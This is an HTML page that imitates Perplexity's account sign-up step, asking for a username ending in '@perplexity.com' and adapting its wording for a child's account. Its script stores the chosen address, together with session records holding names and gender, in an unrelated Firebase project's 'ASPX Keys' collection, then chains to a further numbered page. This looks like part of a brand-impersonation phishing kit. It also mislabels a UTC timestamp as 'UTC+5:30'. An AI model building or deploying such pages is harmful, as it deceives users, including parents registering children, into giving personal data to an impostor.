<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Perplexity - How you’ll sign in</title>
    <style>
        /* CSS Variables for Real-time Theme Switching */
        :root {
            --bg-color: #ffffff;
            --text-color: #000000;
            --sub-text-color: #6e6e73;
            --input-border: #d1d1d6;
            --input-bg: #ffffff;
            --label-bg: #ffffff;
            --btn-bg: #000000;
            --btn-text: #ffffff;
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --bg-color: #1c1c1e;
                --text-color: #ffffff;
                --sub-text-color: #98989d;
                --input-border: #48484a;
                --input-bg: #1c1c1e;
                --label-bg: #1c1c1e;
                --btn-bg: #ffffff;
                --btn-text: #000000;
            }
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            height: 100vh;
            margin: 0;
            padding: 40px 20px;
            background-color: var(--bg-color);
            color: var(--text-color);
            transition: background-color 0.3s, color 0.3s;
        }

        .container {
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        h1 {
            font-size: 32px;
            font-weight: 600;
            margin-bottom: 10px;
        }

        .sub-text {
            color: var(--sub-text-color);
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 30px;
        }

        .input-group {
            position: relative;
            margin-bottom: 5px;
            text-align: left;
        }

        label {
            position: absolute;
            top: -10px;
            left: 12px;
            background: var(--label-bg);
            padding: 0 4px;
            font-size: 12px;
            color: var(--sub-text-color);
            z-index: 1;
        }

        .input-wrapper {
            display: flex;
            align-items: center;
            border: 1px solid var(--input-border);
            border-radius: 24px; /* Increased Radius */
            padding: 12px 16px;
            height: 56px;
            box-sizing: border-box;
            background: var(--input-bg);
        }

        .input-wrapper:focus-within {
            border-color: var(--text-color);
            border-width: 2px;
        }

        input {
            border: none;
            outline: none;
            font-size: 17px;
            width: 100%;
            background: transparent;
            color: var(--text-color);
        }

        .domain-suffix {
            color: var(--sub-text-color);
            font-size: 17px;
            margin-left: 4px;
            white-space: nowrap;
        }

        .instruction-text {
            font-size: 13px;
            color: var(--sub-text-color);
            text-align: left;
            margin-top: 8px;
            margin-left: 10px;
        }

        .error-message {
            color: #d93025;
            font-size: 14px;
            margin-top: 8px;
            display: none;
            text-align: left;
            margin-left: 10px;
        }

        .next-btn {
            width: 100%;
            background-color: var(--btn-bg);
            color: var(--btn-text);
            border: none;
            border-radius: 40px; /* Increased Radius */
            padding: 16px;
            font-size: 18px;
            font-weight: 500;
            margin-top: 30px;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        .next-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1 id="pageHeading">How you’ll sign in</h1>
        <p id="pageSubText" class="sub-text">Create a email address for signing in to your Perplexity Account</p>

        <div class="input-group">
            <label>Username</label>
            <div class="input-wrapper">
                <input type="text" id="usernameInput" placeholder="Username" autocomplete="off">
                <span class="domain-suffix">@perplexity.com</span>
            </div>
            <div id="instruction" class="instruction-text">You can use letters (A-Z), numbers & periods</div>
            <div id="errorMsg" class="error-message">That username is taken. Try another.</div>
        </div>

        <button id="nextBtn" class="next-btn">Next</button>
    </div>

    <script type="module">
        // Imported getDoc to read the single user file for the Kids feature
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, updateDoc, collection, query, where, getDocs, getDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
            authDomain: "question-metabase.firebaseapp.com",
            databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "question-metabase",
            storageBucket: "question-metabase.firebasestorage.app",
            messagingSenderId: "770698198753",
            appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
            measurementId: "G-6ZP1FPMKSJ"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        const usernameInput = document.getElementById('usernameInput');
        const nextBtn = document.getElementById('nextBtn');
        const errorMsg = document.getElementById('errorMsg');
        const instructionText = document.getElementById('instruction');
        const pageHeading = document.getElementById('pageHeading');
        const pageSubText = document.getElementById('pageSubText');

        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session');
        const typeParam = urlParams.get('type');
        const genderParam = urlParams.get('gender'); // Optional: check URL for gender

        // 1. Fetch User Data to configure the "Kids" display format
        async function loadKidsUI() {
            if (!sessionId) return;

            try {
                const docRef = doc(db, "ASPX Keys", sessionId);
                const docSnap = await getDoc(docRef);

                if (docSnap.exists()) {
                    const data = docSnap.data();
                    const firstName = data.firstName || "the user";
                    const isKids = typeParam === 'kids' || data.type === 'kids';
                    const gender = (genderParam || data.gender || "other").toLowerCase();

                    if (isKids) {
                        // Change heading
                        pageHeading.innerText = `Choose how ${firstName} will sign in`;

                        // Evaluate pronouns
                        let subjectPronoun = "They";
                        let possessivePronoun = "their";

                        if (gender === 'male' || gender === 'm') {
                            subjectPronoun = "He";
                            possessivePronoun = "his";
                        } else if (gender === 'female' || gender === 'f') {
                            subjectPronoun = "She";
                            possessivePronoun = "her";
                        }

                        // Change Subtext
                        pageSubText.innerText = `${subjectPronoun} will use this email to sign in to ${possessivePronoun} Perplexity Account`;
                    }
                }
            } catch (error) {
                console.error("Error fetching session data:", error);
            }
        }
        
        // Execute UI check on load
        loadKidsUI();

        // 2. Logic for handling the "Next" action
        async function handleNext() {
            const username = usernameInput.value.trim();
            if (!username) return;

            const fullEmail = username + "@perplexity.com";
            nextBtn.disabled = true;
            nextBtn.innerText = "Processing...";
            errorMsg.style.display = 'none';
            instructionText.style.display = 'block';

            try {
                // Check if username is taken
                const q = query(collection(db, "ASPX Keys"), where("email", "==", fullEmail));
                const querySnapshot = await getDocs(q);

                if (!querySnapshot.empty) {
                    errorMsg.style.display = 'block';
                    instructionText.style.display = 'none';
                    nextBtn.disabled = false;
                    nextBtn.innerText = "Next";
                } else {
                    // If available, update database and redirect
                    if (sessionId) {
                        const docRef = doc(db, "ASPX Keys", sessionId);
                        await updateDoc(docRef, {
                            email: fullEmail,
                            updatedAt: new Date().toLocaleString('en-US', { timeZone: 'UTC', hour12: true }) + " UTC+5:30"
                        });
                        
                        // Redirect to 4.html with the session ID
                        window.location.href = `4.html?session=${sessionId}`;
                    } else {
                        alert("Error: Session ID missing.");
                        nextBtn.disabled = false;
                        nextBtn.innerText = "Next";
                    }
                }
            } catch (error) {
                console.error("Database Error:", error);
                nextBtn.disabled = false;
                nextBtn.innerText = "Next";
            }
        }

        // 3. Restrict input characters (A-Z, a-z, 0-9, .)
        usernameInput.addEventListener('input', (e) => {
            const val = e.target.value;
            // The Regex allows uppercase & lowercase letters, numbers, and periods
            const cleanVal = val.replace(/[^a-zA-Z0-9.]/g, '');
            usernameInput.value = cleanVal;
            errorMsg.style.display = 'none';
            instructionText.style.display = 'block';
        });

        // Click event
        nextBtn.addEventListener('click', handleNext);

        // Enter key event
        usernameInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                handleNext();
            }
        });
    </script>
</body>
</html>
